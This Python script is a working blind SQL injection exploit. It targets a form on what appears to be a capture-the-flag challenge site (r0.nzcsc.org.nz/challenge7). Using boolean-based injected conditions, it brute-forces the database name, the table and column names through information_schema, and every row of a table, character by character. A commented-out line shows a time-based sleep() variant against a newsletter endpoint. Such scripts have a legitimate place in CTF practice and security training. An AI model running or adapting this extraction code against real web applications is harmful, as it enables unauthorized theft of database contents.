import requests
import time
import urllib.parse
from typing import Tuple, List

alphabet = [c for c in ' .:0123456789abcdefghijklmnopqrstuvwxyz']
MAX_WIDTH = 20


def main():
    if not test():
        print('Initial test failed please check send_payload')
        exit(1)
    else:
        # db = brute_db()
        # print(f'DB name is {db}')
        # tables = brute_tables()
        # print(f'Tables are {tables}')
        table = 'tsebehtsiworc'
        # cols = brute_cols(table)
        # print(cols)
        # rows = get_rows(table)
        cols = ['id', 'grade', 'school', 'surname']
        rows = 15
        print(f'Table {table} has {rows} rows')

        data_all = brute_data(table, cols, rows)
        print("===================================================")
        for row in [cols] + data_all:
            print("   ".join([i.ljust(20)[:20] for i in row]))
        print("===================================================")


def format_payload(payload: str) -> str:
    return url_encode(payload)
    # payload_bits = payload.split("'")
    # payload_concat = ""
    # assert len(payload_bits) % 2 == 1
    # for i in range(len(payload_bits) // 2):
    #     payload_concat += payload_bits[i*2]
    #     payload_concat += str_to_concat(payload_bits[i*2+1])
    # payload_concat += payload_bits[-1]
    # print(payload_concat)
    # return url_encode(payload_concat)


def send_payload(payload) -> bool:
    """
    Gets a response from the target and returns true or false (can be boolean or blind)
    :param payload: payload to send in string
    :return: true or false depending on whether request was a success or not
    """
    # for debugging
    # print(payload)

    start = time.time()
    # r = requests.get(f"http://10.10.10.10/newsletter.php?name=t&email=t' OR IF({format_payload(payload)}, sleep(0.1), 'NO') AND '1'='1")
    r = requests.post("https://r0.nzcsc.org.nz/challenge7/", data=f"firstn=a%27+OR+({format_payload(payload)})+--+&subit=Check", headers={'Content-Type': 'application/x-www-form-urlencoded'})
    end = time.time()

    # if "yes" in r.text:        # boolean example
    # if end - start >= 0.1:     # blind example
    if "No rows returned" not in r.text:
        return True
    else:
        return False


def test() -> bool:
    assert_true = send_payload("1=1")
    assert_false = send_payload("1=2")
    return assert_true and not assert_false


def brute_db() -> str:
    length = 0
    for i in range(0, 100):
        if send_payload(f"LENGTH(DATABASE())='{i}'"):
            length = i
            break
    print("Length: %d" % length)
    print("Getting database name: ", end="")

    db_name = ""
    for i in range(1, length + 1):
        for c in alphabet:
            if send_payload(f"SUBSTRING(DATABASE(),{i},1)='{c}'"):
                db_name += c
                print(c, end="")
    print()
    return db_name


def brute_tables(curr_str: str = "", tables_list: list = None) -> list:
    if tables_list is None:
        tables_list = []
        print('Finding table names')
    for c in alphabet:
        next_str = curr_str + c
        if send_payload(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '{next_str}%')>0"):
            if send_payload(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_name='{next_str}')>0"):
                tables_list.append(next_str)
                print(f"\rTable: {next_str}".rjust(MAX_WIDTH))
            else:
                print(f"\r{next_str}".rjust(MAX_WIDTH), end="")
            brute_tables(next_str, tables_list)
    return tables_list


def brute_cols(table: str, curr_str: str = "", cols_list: list = None) -> list:
    if cols_list is None:
        cols_list = []
        print(f'Finding table columns for table {table}')
    for c in alphabet:
        next_str = curr_str + c
        if send_payload(f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND column_name LIKE '{next_str}%')>0"):
            if send_payload(f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND column_name='{next_str}')>0"):
                cols_list.append(next_str)
                print(f"\rTable: {table}.{next_str}".rjust(MAX_WIDTH))
            else:
                print(f"\r{table}.{next_str}".rjust(MAX_WIDTH), end="")
            brute_cols(table, next_str, cols_list)
    return cols_list


def get_rows(table: str) -> int:
    print(f'Finding number of rows in table {table}')
    for rows in range(100):
        if send_payload(f"(SELECT COUNT(*) FROM {table})={rows}"):
            return rows
    raise Exception("Couldn't get number of rows")


def brute_data(table: str, cols: list, rows_n: int, already_known: List[Tuple[str, str]] = None, curr_str: str = None, data_row: List[str] = None, data_all: List[list] = None) -> List[list]:
    if already_known is None:
        already_known = []
    if curr_str is None:
        curr_str = ""
    if data_row is None:
        data_row = []
    if data_all is None:
        data_all = []

    if curr_str == "":
        print("\n=============================================================================")
        for row in [cols] + data_all + [data_row]:
            print("   ".join([i.ljust(20)[:20] for i in row]))

    col = cols[len(data_row)]

    if len(already_known) == 0:
        already_known = [('1', '1')]
    already_known_str = " AND ".join(f"{i[0]}='{i[1]}'" for i in already_known)

    for c in alphabet:
        next_str = curr_str + c
        print(f"\r{table}.{col}[{len(data_all)}]-{next_str}", end="")
        if send_payload(f"(SELECT COUNT(*) FROM {table} WHERE {already_known_str} AND {col} LIKE '{next_str}%')>0"):
            if send_payload(f"(SELECT COUNT(*) FROM {table} WHERE {already_known_str} AND {col}='{next_str}')>0"):
                print(f"Data: \r{table}.{col}[{len(data_all)}]-{next_str}")
                data_row.append(next_str)
                if len(data_row) == len(cols):
                    data_all.append(data_row.copy())
                    data_row.clear()
                    already_known.clear()
                    return data_all
                already_known.append((col, next_str))
                if len(data_row) > 1:
                    return brute_data(table, cols, rows_n, already_known, "", data_row, data_all)
                else:
                    brute_data(table, cols, rows_n, already_known, "", data_row, data_all)
            else:
                if len(data_row) > 0:
                    return brute_data(table, cols, rows_n, already_known, next_str, data_row, data_all)
                else:
                    brute_data(table, cols, rows_n, already_known, next_str, data_row, data_all)

    print(f'\rError in {table}.{col}[{len(data_all)}]')
    next_str = "###ERROR###"
    if len(data_row) == len(cols):
        data_all.append(data_row.copy())
        data_row.clear()
        already_known.clear()
        return data_all
    already_known.append((col, next_str))
    if len(data_row) > 0:
        return brute_data(table, cols, rows_n, already_known, "", data_row, data_all)
    else:
        brute_data(table, cols, rows_n, already_known, "", data_row, data_all)


def url_encode(payload: str) -> str:
    return urllib.parse.quote(payload)


def str_to_concat(payload: str) -> str:
    return "CONCAT(CHAR(" + "),CHAR(".join(str(ord(c)) for c in payload) + "))"


if __name__ == "__main__":
    main()
